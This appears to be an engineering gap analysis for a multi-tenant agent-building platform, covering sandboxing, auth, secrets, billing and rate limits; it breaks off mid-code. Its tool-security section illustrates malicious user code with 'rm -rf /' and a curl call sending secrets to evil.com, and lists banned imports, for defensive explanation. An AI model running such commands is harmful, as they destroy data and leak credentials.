# Missing Components Analysis - Agent Platform for Thousands of Users

**Date:** 2026-08-26
**Context:** Building a production platform where thousands of users can build custom agents with tools, prompts, subagents, and sandboxes.

**Prime-Agent Assessment:** Excellent orchestration layer (session management, crash recovery, event journaling, contracts). Missing critical **platform layer** components for multi-tenant user-facing service.

---

## Critical Gaps (🔴 Must Build Before Launch)

### 1. Tool Code Security & Validation

**Problem:** Users write arbitrary Python code for custom tools - extremely dangerous without proper sandboxing and validation.

**What Prime-Agent Has:**
- Sandbox abstraction for agent execution environments
- `ToolProvider` protocol for tool invocation

**What's Missing:**
```python
# Dangerous user code example:
tool_code = """
import os
os.system('rm -rf /')  # Malicious code
subprocess.run(['curl', 'evil.com/steal?data=secrets'])
while True: pass  # Infinite loop consuming resources
"""
```

**Required Components:**

1. **Static Code Analysis**
   - AST parsing to detect dangerous patterns
   - Banned imports list (os, subprocess, socket, etc.)
   - Complexity analysis (max loops, recursion depth)

2. **Runtime Sandboxing**
   - Restricted `__builtins__` (no `eval`, `exec`, `__import__`)
   - No file system access (or scoped to workspace only)
   - No network access (or allowlist only)
   - RestrictedPython or PyPy sandbox

3. **Resource Limits**
   - CPU time limit per tool execution (e.g., 30 seconds)
   - Memory limit per tool (e.g., 512MB)
   - Output size limit (prevent log bombs)

4. **Code Review Workflow**
   - Manual approval for first-time tools
   - Automated static analysis before approval
   - Tool status: `draft` → `validating` → `approved` → `active`

**Implementation Architecture:**
```python
class ToolCodeValidator:
    def validate_ast(self, code: str) -> ValidationResult:
        # Parse AST, check for banned patterns

    def analyze_imports(self, code: str) -> list[str]:
        # Extract and validate import statements

class SecureToolExecutor:
    def execute_sandboxed(
        self,
        code: str,
        args: dict,
        limits: ResourceLimits
    ) -> ToolResult:
        # Execute in restricted environment with timeouts
```

**Estimated Effort:** 3-4 weeks for basic version, ongoing security hardening

---

### 2. User Identity & Multi-Tenancy

**Problem:** Who owns which agents? How to prevent user A from accessing user B's data?

**What Prime-Agent Has:**
- `TenantQuotaEnforcer` (basic per-tenant quota tracking)
- Session-level isolation

**What's Missing:**

1. **Authentication System**
   - JWT/OAuth integration
   - API key generation for programmatic access
   - Session management
   - Password reset, 2FA support

2. **Authorization Layer**
   ```python
   # Required checks:
   - Can user_id="123" read agent_id="abc"?
   - Can user_id="123" execute session_id="xyz"?
   - Can user_id="123" update tool_id="def"?

   # RBAC model:
   roles = {
       "owner": ["read", "write", "delete", "execute"],
       "collaborator": ["read", "execute"],
       "viewer": ["read"]
   }
   ```

3. **Database Row-Level Security**
   ```sql
   -- Every table needs user_id/tenant_id
   CREATE TABLE agents (
       id UUID PRIMARY KEY,
       user_id UUID NOT NULL,  -- NEW: ownership
       name TEXT,
       config JSONB,
       created_at TIMESTAMP
   );

   CREATE INDEX idx_agents_user ON agents(user_id);

   -- Queries always filter by user_id
   SELECT * FROM agents WHERE user_id = :current_user_id;
   ```

4. **User Quotas & Limits**
   ```python
   user_quotas = {
       "free_tier": {
           "max_agents": 5,
           "max_concurrent_sessions": 2,
           "max_storage_mb": 100,
           "monthly_budget_usd": 10
       },
       "pro_tier": {
           "max_agents": 50,
           "max_concurrent_sessions": 10,
           "max_storage_mb": 10_000,
           "monthly_budget_usd": 100
       }
   }
   ```

**Implementation Architecture:**
```python
# Middleware
class AuthMiddleware:
    async def __call__(self, request: Request):
        token = request.headers.get("Authorization")
        user = await self.auth_service.verify_token(token)
        request.state.user = user

class AuthzService:
    async def can_access_agent(
        self,
        user_id: str,
        agent_id: str,
        permission: str
    ) -> bool:
        # Check ownership or shared access
```

**Estimated Effort:** 2-3 weeks for basic auth, 1-2 weeks for RBAC

---

### 3. User-Facing API Layer

**Problem:** Prime-Agent API is low-level (sessions, events). Users need high-level agent/tool CRUD.

**What Prime-Agent Has:**
```python
# Low-level supervisor API:
POST /sessions/create
POST /sessions/{session_id}/send
GET  /sessions/{session_id}/state
```

**What's Missing:**
```python
# High-level user API needed:

# ============ AGENTS ============
POST   /api/v1/agents
  Body: {
    "name": "My Coding Agent",
    "description": "Helps with Python coding",
    "prompt": "You are a coding assistant...",
    "tools": ["tool_id_1", "tool_id_2"],
    "subagents": [...],
    "sandbox": "docker"
  }
  Response: {"agent_id": "...", "status": "active"}

GET    /api/v1/agents
  Response: [{"agent_id": "...", "name": "...", ...}]

GET    /api/v1/agents/{agent_id}
PUT    /api/v1/agents/{agent_id}
DELETE /api/v1/agents/{agent_id}

# ============ TOOLS ============
POST   /api/v1/tools
  Body: {
    "name": "fetch_weather",
    "description": "Get current weather",
    "parameters": {...},  # JSON Schema
    "code": "def execute(city: str): ..."
  }
  Response: {"tool_id": "...", "status": "validating"}

GET    /api/v1/tools
GET    /api/v1/tools/{tool_id}
PUT    /api/v1/tools/{tool_id}
DELETE /api/v1/tools/{tool_id}

# ============ EXECUTION ============
POST   /api/v1/agents/{agent_id}/run
  Body: {"message": "Write a function to calculate fibonacci"}
  Response: SSE stream of events

GET    /api/v1/agents/{agent_id}/sessions
  Response: [{"session_id": "...", "created_at": "...", ...}]

GET    /api/v1/agents/{agent_id}/sessions/{session_id}/events
  Response: [{"type": "ToolStart", "data": {...}, ...}]

# ============ SECRETS ============
POST   /api/v1/secrets
  Body: {"name": "OPENAI_API_KEY", "value": "sk-..."}

GET    /api/v1/secrets  # Returns names only, not values
DELETE /api/v1/secrets/{name}
```

**Implementation Architecture:**
```python
# FastAPI User-Facing Service
@app.post("/api/v1/agents")
async def create_agent(
    agent: AgentCreateRequest,
    user: User = Depends(get_current_user)
):
    # 1. Validate user quota
    if await quota_service.exceeds_limit(user.id, "max_agents"):
        raise HTTPException(403, "Agent limit reached")

    # 2. Validate tools exist and user owns them
    await tool_registry.verify_ownership(user.id, agent.tools)

    # 3. Create composition with digests
    composition = await composition_service.create(
        user_id=user.id,
        prompt=agent.prompt,
        tools=agent.tools,
        subagents=agent.subagents
    )

    # 4. Store agent metadata
    agent_record = await db.agents.insert({
        "user_id": user.id,
        "name": agent.name,
        "composition_id": composition.id,
        "composition_digest": composition.digest
    })

    return {"agent_id": agent_record.id}
```

**Estimated Effort:** 3-4 weeks for core CRUD, ongoing feature additions

---

### 4. Tool Registry & Versioning

**Problem:** Where are user tools stored? How to handle updates without breaking existing agents?

**What Prime-Agent Has:**
- `CompositionCatalog` with digest-based immutability (for system tools)
- `ToolProvider` protocol

**What's Missing:**

1. **Tool Storage Schema**
   ```sql
   CREATE TABLE user_tools (
       id UUID PRIMARY KEY,
       user_id UUID NOT NULL,
       name TEXT NOT NULL,
       description TEXT,
       parameters JSONB,  -- JSON Schema
       code TEXT NOT NULL,
       version TEXT NOT NULL,  -- e.g., "1.0.0"
       digest TEXT NOT NULL,   -- sha256 of code+params
       status TEXT,  -- draft|validating|approved|rejected|active|deprecated
       created_at TIMESTAMP,
       updated_at TIMESTAMP,

       UNIQUE(user_id, name, version)
   );

   CREATE TABLE tool_executions (
       id UUID PRIMARY KEY,
       tool_id UUID REFERENCES user_tools(id),
       session_id TEXT,
       args JSONB,
       result JSONB,
       duration_ms INT,
       error TEXT,
       executed_at TIMESTAMP
   );
   ```

2. **Versioning Workflow**
   ```python
   # User creates tool v1:
   POST /api/v1/tools
   → tool_id="tool_123", version="1.0.0", digest="sha256:abc..."

   # Agent pins specific version:
   agent.tools = [
       {"tool_id": "tool_123", "digest": "sha256:abc..."}
   ]

   # User updates tool → creates NEW version:
   PUT /api/v1/tools/tool_123
   → tool_id="tool_123", version="1.1.0", digest="sha256:xyz..."

   # Old agents still use v1.0.0 (digest-pinned)
   # New agents can use v1.1.0
   ```

3. **Tool Validation Pipeline**
   ```python
   class ToolValidationPipeline:
       async def submit(self, tool: UserTool) -> ValidationJob:
           job = await self.queue.enqueue({
               "tool_id": tool.id,
               "code": tool.code
           })
           await self.db.update_status(tool.id, "validating")
           return job

       async def validate(self, job: ValidationJob):
           # Step 1: Static analysis
           ast_result = await self.ast_validator.check(job.code)
           if not ast_result.safe:
               await self.reject(job.tool_id, ast_result.errors)
               return

           # Step 2: Test execution in sandbox
           test_result = await self.sandbox_tester.run(job.code)
           if test_result.crashed:
               await self.reject(job.tool_id, "Execution failed")
               return

           # Step 3: Approve
           await self.approve(job.tool_id)
   ```

4. **Tool Discovery**
   ```python
   # Public tool marketplace (optional):
   GET /api/v1/tools/marketplace
   → Returns community-contributed tools

   # User can fork public tools:
   POST /api/v1/tools/{public_tool_id}/fork
   → Creates copy in user's namespace
   ```

**Implementation Architecture:**
```python
class UserToolRegistry:
    async def create(self, user_id: str, tool: ToolDefinition) -> Tool:
        # 1. Compute digest
        digest = compute_digest(tool.code, tool.parameters)

        # 2. Check if exists
        existing = await self.db.find_by_digest(user_id, digest)
        if existing:
            return existing  # Idempotent

        # 3. Create new version
        version = self._next_version(user_id, tool.name)
        record = await self.db.insert({
            "user_id": user_id,
            "name": tool.name,
            "code": tool.code,
            "version": version,
            "digest": digest,
            "status": "draft"
        })

        # 4. Enqueue validation
        await self.validation_pipeline.submit(record)

        return record

class UserToolProvider:  # Implements ToolProvider protocol
    async def list_tools(self) -> list[ToolDescriptor]:
        # Load active tools for current user from DB

    async def invoke(self, ctx: ToolInvokeContext, name: str, args: dict):
        # 1. Load tool code by digest (pinned version)
        tool = await self.registry.get_by_digest(ctx.tool_digest)

        # 2. Execute in sandbox with user's secrets
        result = await self.executor.execute(
            code=tool.code,
            args=args,
            secrets=ctx.user_secrets,
            limits=ctx.resource_limits
        )

        # 3. Log execution
        await self.db.log_execution(tool.id, args, result)

        return result
```

**Estimated Effort:** 4-5 weeks for registry + validation, 2-3 weeks for versioning

---

### 5. Secrets Management

**Problem:** Users' tools need API keys, credentials - must be stored securely and injected at runtime.

**What Prime-Agent Has:**
- Nothing for secrets management

**What's Missing:**

1. **Encrypted Secrets Storage**
   ```sql
   CREATE TABLE user_secrets (
       id UUID PRIMARY KEY,
       user_id UUID NOT NULL,
       name TEXT NOT NULL,  -- e.g., "OPENAI_API_KEY"
       encrypted_value TEXT NOT NULL,  -- AES-256 encrypted
       created_at TIMESTAMP,
       updated_at TIMESTAMP,
       last_used_at TIMESTAMP,

       UNIQUE(user_id, name)
   );
   ```

2. **Encryption Service**
   ```python
   class SecretsVault:
       def __init__(self, master_key: bytes):
           self.cipher = Fernet(master_key)  # Or AWS KMS, HashiCorp Vault

       async def store(self, user_id: str, name: str, value: str):
           encrypted = self.cipher.encrypt(value.encode())
           await self.db.upsert({
               "user_id": user_id,
               "name": name,
               "encrypted_value": encrypted.decode()
           })

       async def retrieve(self, user_id: str, name: str) -> str:
           row = await self.db.find(user_id, name)
           if not row:
               raise SecretNotFound(name)
           decrypted = self.cipher.decrypt(row.encrypted_value.encode())
           await self.db.update_last_used(row.id)
           return decrypted.decode()

       async def delete(self, user_id: str, name: str):
           await self.db.delete(user_id, name)
   ```

3. **Runtime Injection**
   ```python
   class SecureToolInvokeContext(ToolInvokeContext):
       user_id: str
       user_secrets: dict[str, str]  # Injected at runtime, never logged

   # In tool execution:
   async def execute_user_tool(session_id: str, tool_name: str, args: dict):
       # 1. Get user_id from session
       session = await db.sessions.get(session_id)
       user_id = session.user_id

       # 2. Load user's secrets
       secret_names = await tool_registry.get_required_secrets(tool_name)
       secrets = {}
       for name in secret_names:
           secrets[name] = await secrets_vault.retrieve(user_id, name)

       # 3. Build context with secrets
       ctx = SecureToolInvokeContext(
           user_id=user_id,
           user_secrets=secrets,
           session_id=session_id
       )

       # 4. Execute tool (secrets available in execution environment)
       result = await tool_provider.invoke(ctx, tool_name, args)

       return result
   ```

4. **Tool Secrets Declaration**
   ```python
   # User declares required secrets when creating tool:
   POST /api/v1/tools
   {
       "name": "fetch_weather",
       "code": "...",
       "required_secrets": ["WEATHER_API_KEY"]  # NEW
   }

   # Before agent runs, check secrets exist:
   async def validate_agent_runnable(user_id: str, agent_id: str):
       agent = await db.agents.get(agent_id)
       for tool_id in agent.tools:
           tool = await tool_registry.get(tool_id)
           for secret_name in tool.required_secrets:
               if not await secrets_vault.exists(user_id, secret_name):
                   raise MissingSecretError(
                       f"Tool '{tool.name}' requires secret '{secret_name}'"
                   )
   ```

**Security Considerations:**
- Master encryption key stored in environment variable or KMS
- Secrets never logged in events or error messages
- Secrets never returned in API responses (only names)
- Audit log for secret access
- Rotation support

**Implementation Architecture:**
```python
# API endpoints
@app.post("/api/v1/secrets")
async def create_secret(
    secret: SecretCreate,
    user: User = Depends(get_current_user)
):
    await secrets_vault.store(user.id, secret.name, secret.value)
    return {"name": secret.name, "created_at": datetime.utcnow()}

@app.get("/api/v1/secrets")
async def list_secrets(user: User = Depends(get_current_user)):
    # Returns names only, NOT values
    secrets = await secrets_vault.list(user.id)
    return [{"name": s.name, "created_at": s.created_at} for s in secrets]
```

**Estimated Effort:** 2-3 weeks for basic implementation, consider using HashiCorp Vault for production

---

### 6. Multi-Tenant Data Storage

**Problem:** Users' agents need to persist data (files, databases) - must be isolated and quota-enforced.

**What Prime-Agent Has:**
- `session_workspace()` - local filesystem per session
- No multi-tenant isolation or cloud storage

**What's Missing:**

1. **Storage Abstraction**
   ```python
   class UserStorageProvider(Protocol):
       async def write_file(
           self,
           user_id: str,
           agent_id: str,
           path: str,
           content: bytes
       ) -> None: ...

       async def read_file(
           self,
           user_id: str,
           agent_id: str,
           path: str
       ) -> bytes: ...

       async def list_files(
           self,
           user_id: str,
           agent_id: str
       ) -> list[str]: ...

       async def delete_file(
           self,
           user_id: str,
           agent_id: str,
           path: str
       ) -> None: ...

       async def get_usage(self, user_id: str) -> int:
           """Returns total bytes used by user."""
   ```

2. **Storage Backends**
   ```python
   # Local filesystem (dev/testing):
   class LocalStorageProvider:
       def __init__(self, base_path: Path):
           self.base = base_path

       async def write_file(self, user_id, agent_id, path, content):
           user_dir = self.base / user_id / agent_id
           user_dir.mkdir(parents=True, exist_ok=True)
           (user_dir / path).write_bytes(content)

   # S3 (production):
   class S3StorageProvider:
       def __init__(self, bucket: str, s3_client):
           self.bucket = bucket
           self.s3 = s3_client

       async def write_file(self, user_id, agent_id, path, content):
           key = f"users/{user_id}/agents/{agent_id}/{path}"
           await self.s3.put_object(
               Bucket=self.bucket,
               Key=key,
               Body=content
           )
   ```

3. **Quota Enforcement**
   ```python
   class QuotaEnforcedStorage:
       def __init__(
           self,
           backend: UserStorageProvider,
           quota_service: QuotaService
       ):
           self.backend = backend
           self.quotas = quota_service

       async def write_file(self, user_id, agent_id, path, content):
           # Check quota before write
           current_usage = await self.backend.get_usage(user_id)
           new_size = len(content)
           user_limit = await self.quotas.get_storage_limit(user_id)

           if current_usage + new_size > user_limit:
               raise StorageQuotaExceeded(
                   f"Would exceed {user_limit} bytes limit"
               )

           await self.backend.write_file(user_id, agent_id, path, content)
           await self.quotas.increment_usage(user_id, new_size)
   ```

4. **Tool Access to Storage**
   ```python
   # Users' tools can access storage via injected API:
   def user_tool_code():
       # Available in tool execution context:
       storage = get_storage()  # Injected by platform

       # Write file
       storage.write("results.json", json.dumps(data))

       # Read file
       content = storage.read("input.csv")

       # List files
       files = storage.list_files()

   # Platform implementation:
   class ToolExecutionContext:
       def __init__(self, user_id: str, agent_id: str, storage: UserStorageProvider):
           self.storage = ScopedStorage(storage, user_id, agent_id)

       def get_storage(self):
           return self.storage  # Scoped to current user/agent
   ```

**Storage Schema:**
```sql
CREATE TABLE storage_usage (
    user_id UUID PRIMARY KEY,
    bytes_used BIGINT DEFAULT 0,
    file_count INT DEFAULT 0,
    updated_at TIMESTAMP
);

CREATE INDEX idx_storage_usage_updated ON storage_usage(updated_at);
```

**Estimated Effort:** 2-3 weeks for abstraction + S3 backend, 1 week for quotas

---

### 7. User Observability & Debugging

**Problem:** Users need dashboards to see what their agents are doing, debug errors, track costs.

**What Prime-Agent Has:**
- OpenTelemetry metrics and tracing
- Event journaling
- Internal observability

**What's Missing:**

1. **User-Scoped Logs API**
   ```python
   GET /api/v1/agents/{agent_id}/logs
   Query params:
     - session_id (optional): filter to specific session
     - level: error|warning|info|debug
     - start_time, end_time

   Response: [
       {
           "timestamp": "2026-08-26T10:30:00Z",
           "level": "error",
           "message": "Tool 'fetch_weather' failed",
           "session_id": "sess_123",
           "tool_name": "fetch_weather",
           "error": "API key invalid"
       }
   ]
   ```

2. **User Metrics Dashboard**
   ```python
   GET /api/v1/agents/{agent_id}/metrics
   Response: {
       "total_sessions": 150,
       "total_cost_usd": 12.45,
       "total_tokens": 1_500_000,
       "avg_session_duration_s": 45.2,
       "tool_usage": {
           "fetch_weather": 50,
           "analyze_data": 30
       },
       "error_rate": 0.02,
       "last_24h": {
           "sessions": 15,
           "cost_usd": 1.23
       }
   }
   ```

3. **Session Event Viewer**
   ```python
   GET /api/v1/agents/{agent_id}/sessions/{session_id}/events
   Response: [
       {
           "seq": 1,
           "type": "RunStart",
           "timestamp": "2026-08-26T10:00:00Z"
       },
       {
           "seq": 2,
           "type": "TurnStart",
           "timestamp": "2026-08-26T10:00:01Z"
       },
       {
           "seq": 3,
           "type": "ToolStart",
           "timestamp": "2026-08-26T10:00:02Z",
           "data": {
               "tool_call_id": "call_123",
               "tool_name": "fetch_weather",
               "args": {"city": "NYC"}
           }
       },
       {
           "seq": 4,
           "type": "ToolEnd",
           "timestamp": "2026-08-26T10:00:05Z",
           "data": {
               "tool_call_id": "call_123",
               "result": {"temp": 72, "condition": "sunny"},
               "is_error": false
           }
       }
   ]
   ```

4. **Cost Tracking Per User**
   ```python
   GET /api/v1/usage
   Response: {
       "current_period": {
           "start": "2026-08-01",
           "end": "2026-08-31",
           "total_cost_usd": 45.67,
           "budget_limit_usd": 100.00,
           "usage_percent": 45.67
       },
       "by_agent": [
           {
               "agent_id": "agent_123",
               "agent_name": "My Coding Agent",
               "cost_usd": 30.00,
               "sessions": 100
           },
           {
               "agent_id": "agent_456",
               "cost_usd": 15.67,
               "sessions": 50
           }
       ],
       "daily_breakdown": [
           {"date": "2026-08-25", "cost_usd": 2.34},
           {"date": "2026-08-26", "cost_usd": 1.89}
       ]
   }
   ```

5. **Real-Time Monitoring**
   ```python
   # WebSocket for live session monitoring
   WS /api/v1/agents/{agent_id}/sessions/{session_id}/stream

   # Sends events as they happen:
   {
       "type": "event",
       "data": {
           "type": "ToolStart",
           "tool_name": "analyze_data",
           "timestamp": "..."
       }
   }
   ```

**Implementation:**
```python
# Logs aggregation service
class UserLogsService:
    async def query(
        self,
        user_id: str,
        agent_id: str | None,
        session_id: str | None,
        level: str | None,
        start_time: datetime,
        end_time: datetime
    ) -> list[LogEntry]:
        # Query from journal events + application logs
        events = await self.journal_reader.read_range(
            user_id=user_id,
            start_time=start_time,
            end_time=end_time
        )

        # Filter error events
        logs = [
            self._event_to_log(e)
            for e in events
            if self._matches_filters(e, level, agent_id, session_id)
        ]

        return logs

# Metrics aggregation
class UserMetricsService:
    async def aggregate(self, user_id: str, agent_id: str) -> AgentMetrics:
        # Query from events table
        stats = await self.db.query("""
            SELECT
                COUNT(DISTINCT session_id) as total_sessions,
                SUM(CASE WHEN type = 'MessageEnd'
                    THEN (payload->'usage'->>'cost_total')::float
                    ELSE 0 END) as total_cost,
                COUNT(CASE WHEN type = 'ErrorEvent' THEN 1 END) as error_count
            FROM events
            WHERE user_id = :user_id
              AND agent_id = :agent_id
        """, {"user_id": user_id, "agent_id": agent_id})

        return AgentMetrics(**stats)
```

**Database Schema:**
```sql
-- Add user_id/agent_id to events for efficient querying
ALTER TABLE events ADD COLUMN user_id UUID;
ALTER TABLE events ADD COLUMN agent_id UUID;
CREATE INDEX idx_events_user_agent ON events(user_id, agent_id, created_at);

-- Metrics rollup table (optional, for performance)
CREATE TABLE daily_metrics (
    user_id UUID,
    agent_id UUID,
    date DATE,
    total_sessions INT,
    total_cost DECIMAL(10,2),
    total_tokens BIGINT,
    error_count INT,

    PRIMARY KEY (user_id, agent_id, date)
);
```

**Estimated Effort:** 3-4 weeks for logs/metrics APIs, 2-3 weeks for frontend dashboards

---

### 8. Billing & Payment Integration

**Problem:** How to charge users for LLM usage, compute, storage?

**What Prime-Agent Has:**
- `BudgetTracker` - per-session cost tracking
- Usage data in events (tokens, cost)

**What's Missing:**

1. **User Billing Records**
   ```sql
   CREATE TABLE billing_accounts (
       user_id UUID PRIMARY KEY,
       stripe_customer_id TEXT,
       plan TEXT,  -- free|pro|enterprise
       billing_email TEXT,
       payment_method_id TEXT,
       created_at TIMESTAMP
   );

   CREATE TABLE invoices (
       id UUID PRIMARY KEY,
       user_id UUID REFERENCES billing_accounts(user_id),
       period_start DATE,
       period_end DATE,
       subtotal_usd DECIMAL(10,2),
       tax_usd DECIMAL(10,2),
       total_usd DECIMAL(10,2),
       status TEXT,  -- draft|open|paid|void
       stripe_invoice_id TEXT,
       created_at TIMESTAMP,
       paid_at TIMESTAMP
   );

   CREATE TABLE invoice_line_items (
       id UUID PRIMARY KEY,
       invoice_id UUID REFERENCES invoices(id),
       description TEXT,
       quantity INT,
       unit_price_usd DECIMAL(10,4),
       amount_usd DECIMAL(10,2)
   );
   ```

2. **Usage Aggregation**
   ```python
   class BillingAggregator:
       async def compute_monthly_usage(
           self,
           user_id: str,
           month: date
       ) -> UsageReport:
           # Aggregate from events
           result = await self.db.query("""
               SELECT
                   SUM(
                       CASE WHEN e.type = 'MessageEnd'
                       THEN (e.payload->'usage'->>'cost_total')::float
                       ELSE 0 END
                   ) as llm_cost,
                   SUM(
                       CASE WHEN e.type = 'ToolEnd'
                       THEN (e.payload->>'duration_ms')::int / 1000.0 * 0.0001
                       ELSE 0 END
                   ) as compute_cost
               FROM events e
               JOIN sessions s ON e.session_id = s.id
               WHERE s.user_id = :user_id
                 AND e.created_at >= :month_start
                 AND e.created_at < :month_end
           """, {
               "user_id": user_id,
               "month_start": month,
               "month_end": month + timedelta(days=31)
           })

           storage_cost = await self.storage.get_cost(user_id)

           return UsageReport(
               llm_cost=result.llm_cost,
               compute_cost=result.compute_cost,
               storage_cost=storage_cost,
               total=result.llm_cost + result.compute_cost + storage_cost
           )
   ```

3. **Stripe Integration**
   ```python
   class PaymentService:
       def __init__(self, stripe_api_key: str):
           stripe.api_key = stripe_api_key

       async def create_customer(self, user_id: str, email: str):
           customer = stripe.Customer.create(
               email=email,
               metadata={"user_id": user_id}
           )
           await self.db.update_billing_account(
               user_id,
               stripe_customer_id=customer.id
           )
           return customer

       async def charge_monthly_usage(self, user_id: str, month: date):
           # 1. Get usage
           usage = await self.billing_aggregator.compute_monthly_usage(
               user_id,
               month
           )

           # 2. Create Stripe invoice
           billing = await self.db.get_billing_account(user_id)
           invoice = stripe.Invoice.create(
               customer=billing.stripe_customer_id,
               auto_advance=True,
               collection_method="charge_automatically"
           )

           # 3. Add line items
           stripe.InvoiceItem.create(
               customer=billing.stripe_customer_id,
               invoice=invoice.id,
               amount=int(usage.llm_cost * 100),  # cents
               currency="usd",
               description=f"LLM usage for {month.strftime('%B %Y')}"
           )

           # 4. Finalize and charge
           invoice = stripe.Invoice.finalize_invoice(invoice.id)

           # 5. Store in DB
           await self.db.create_invoice(user_id, invoice, usage)

           return invoice
   ```

4. **Budget Alerts**
   ```python
   class BudgetAlertService:
       async def check_budget(self, user_id: str):
           current_usage = await self.usage_service.get_current_month(user_id)
           budget_limit = await self.quotas.get_budget_limit(user_id)

           percent_used = (current_usage.total / budget_limit) * 100

           # Alert thresholds: 50%, 80%, 90%, 100%
           if percent_used >= 100:
               await self.pause_user_agents(user_id)
               await self.notify_user(user_id, "budget_exceeded")
           elif percent_used >= 90:
               await self.notify_user(user_id, "budget_warning_90")
           elif percent_used >= 80:
               await self.notify_user(user_id, "budget_warning_80")
   ```

5. **Pricing API**
   ```python
   GET /api/v1/pricing
   Response: {
       "plans": [
           {
               "name": "free",
               "price_usd": 0,
               "included_usage_usd": 10,
               "limits": {
                   "max_agents": 5,
                   "max_concurrent_sessions": 2
               }
           },
           {
               "name": "pro",
               "price_usd": 29,
               "included_usage_usd": 100,
               "limits": {
                   "max_agents": 50,
                   "max_concurrent_sessions": 10
               }
           }
       ],
       "usage_pricing": {
           "llm_tokens": "pass-through + 10% markup",
           "compute_seconds": 0.0001,
           "storage_gb_month": 0.10
       }
   }
   ```

**Estimated Effort:** 4-5 weeks for Stripe integration + invoicing, 1-2 weeks for budget alerts

---

### 9. Tool Dependency Management

**Problem:** Users' tools need external Python packages (pandas, requests, etc.)

**What Prime-Agent Has:**
- Sandbox execution environments
- No package management

**What's Missing:**

1. **Requirements Declaration**
   ```python
   POST /api/v1/tools
   {
       "name": "analyze_csv",
       "code": "import pandas as pd\ndef execute(path): ...",
       "requirements": [  # NEW
           "pandas==2.0.0",
           "numpy>=1.24.0"
       ]
   }
   ```

2. **Dependency Resolution**
   ```python
   class DependencyResolver:
       async def resolve(self, requirements: list[str]) -> ResolvedDeps:
           # 1. Parse requirements
           parsed = [Requirement(r) for r in requirements]

           # 2. Check against allowlist (security)
           for req in parsed:
               if req.name in self.banned_packages:
                   raise SecurityError(f"Package {req.name} not allowed")

           # 3. Resolve versions using pip
           result = await asyncio.create_subprocess_exec(
               "pip", "install", "--dry-run", *requirements,
               stdout=asyncio.subprocess.PIPE,
               stderr=asyncio.subprocess.PIPE
           )

           # 4. Return resolved package list
           return ResolvedDeps(packages=parsed)
   ```

3. **Sandboxed Package Installation**
   ```python
   class SandboxEnvironmentBuilder:
       async def build(self, tool: Tool) -> Path:
           # 1. Create isolated virtualenv
           env_dir = self.cache_dir / f"tool_{tool.id}_{tool.digest}"

           if env_dir.exists():
               return env_dir  # Cached

           # 2. Create venv
           await asyncio.create_subprocess_exec(
               "python", "-m", "venv", str(env_dir)
           )

           # 3. Install requirements
           pip = env_dir / "bin" / "pip"
           await asyncio.create_subprocess_exec(
               str(pip), "install", *tool.requirements
           )

           # 4. Install tool code
           tool_file = env_dir / "user_tool.py"
           tool_file.write_text(tool.code)

           return env_dir
   ```

4. **Cached Environments**
   ```python
   # Reuse environments with same dependencies
   class EnvironmentCache:
       def __init__(self, max_size_gb: int = 50):
           self.cache_dir = Path("/var/cache/tool-envs")
           self.max_size = max_size_gb * 1024**3

       def key(self, requirements: list[str]) -> str:
           # Hash of sorted requirements
           canonical = "\n".join(sorted(requirements))
           return hashlib.sha256(canonical.encode()).hexdigest()

       async def get_or_create(self, requirements: list[str]) -> Path:
           key = self.key(requirements)
           env_dir = self.cache_dir / key

           if env_dir.exists():
               # Touch to update LRU
               (env_dir / ".last_used").touch()
               return env_dir

           # Build new environment
           await self.builder.build(env_dir, requirements)

           # Cleanup if cache too large
           await self.evict_old_environments()

           return env_dir
   ```

5. **Security Scanning**
   ```python
   class PackageSecurityScanner:
       async def check_safety(self, requirements: list[str]) -> ScanResult:
           # Use safety.db or Snyk API
           result = await asyncio.create_subprocess_exec(
               "safety", "check", "--stdin",
               input="\n".join(requirements).encode(),
               stdout=asyncio.subprocess.PIPE
           )

           vulnerabilities = self._parse_output(result.stdout)

           if vulnerabilities:
               return ScanResult(
                   safe=False,
                   vulnerabilities=vulnerabilities
               )

           return ScanResult(safe=True)
   ```

**Database Schema:**
```sql
CREATE TABLE tool_environments (
    requirements_hash TEXT PRIMARY KEY,
    requirements JSONB,
    path TEXT,
    created_at TIMESTAMP,
    last_used_at TIMESTAMP,
    size_bytes BIGINT
);
```

**Estimated Effort:** 3-4 weeks for basic implementation, ongoing security maintenance

---

### 10. Rate Limiting & Abuse Prevention

**Problem:** Prevent users from overloading the platform or abusing resources.

**What Prime-Agent Has:**
- `TenantQuotaEnforcer` - basic per-tenant quotas
- `BudgetTracker` - cost caps

**What's Missing:**

1. **Comprehensive Rate Limits**
   ```python
   # Multiple limit dimensions:
   rate_limits = {
       "api_requests": "1000/hour",         # API calls
       "agent_executions": "100/hour",      # Agent runs
       "concurrent_sessions": 10,           # Active sessions
       "tool_executions": "500/hour",       # Total tool calls
       "tokens_per_minute": 100_000,        # LLM tokens
       "storage_operations": "1000/hour"    # File reads/writes
   }
   ```

2. **Rate Limiter Implementation**
   ```python
   class RateLimiter:
       def __init__(self, redis_client):
           self.redis = redis_client

       async def check_limit(
           self,
           key: str,          # e.g., "user:123:api_requests"
           limit: int,        # e.g., 1000
           window_seconds: int  # e.g., 3600 (1 hour)
       ) -> tuple[bool, int]:
           """Returns (allowed, remaining)"""

           # Redis sliding window
           now = time.time()
           window_start = now - window_seconds

           pipe = self.redis.pipeline()

           # Remove old entries
           pipe.zremrangebyscore(key, 0, window_start)

           # Count current
           pipe.zcard(key)

           # Add current request
           pipe.zadd(key, {str(now): now})

           # Set expiry
           pipe.expire(key, window_seconds)

           _, count, _, _ = await pipe.execute()

           if count >= limit:
               return False, 0

           return True, limit - count - 1

       async def enforce(self, key: str, limit: int, window: int):
           allowed, remaining = await self.check_limit(key, limit, window)

           if not allowed:
               raise RateLimitExceeded(
                   f"Rate limit exceeded. Try again in {window}s"
               )

           return remaining
   ```

3. **Middleware Integration**
   ```python
   class RateLimitMiddleware:
       async def __call__(self, request: Request, call_next):
           user = request.state.user

           # Check API request limit
           remaining = await self.limiter.enforce(
               f"user:{user.id}:api_requests",
               limit=1000,
               window=3600
           )

           response = await call_next(request)

           # Add rate limit headers
           response.headers["X-RateLimit-Limit"] = "1000"
           response.headers["X-RateLimit-Remaining"] = str(remaining)
           response.headers["X-RateLimit-Reset"] = str(int(time.time()) + 3600)

           return response
   ```

4. **Concurrency Limits**
   ```python
   class ConcurrencyLimiter:
       async def acquire_session_slot(self, user_id: str) -> bool:
           """Returns True if user can start a new session."""

           # Count active sessions
           active = await self.db.count_active_sessions(user_id)
           limit = await self.quotas.get_concurrent_limit(user_id)

           if active >= limit:
               raise ConcurrencyLimitExceeded(
                   f"Maximum {limit} concurrent sessions"
               )

           # Reserve slot
           await self.redis.incr(f"user:{user_id}:active_sessions")
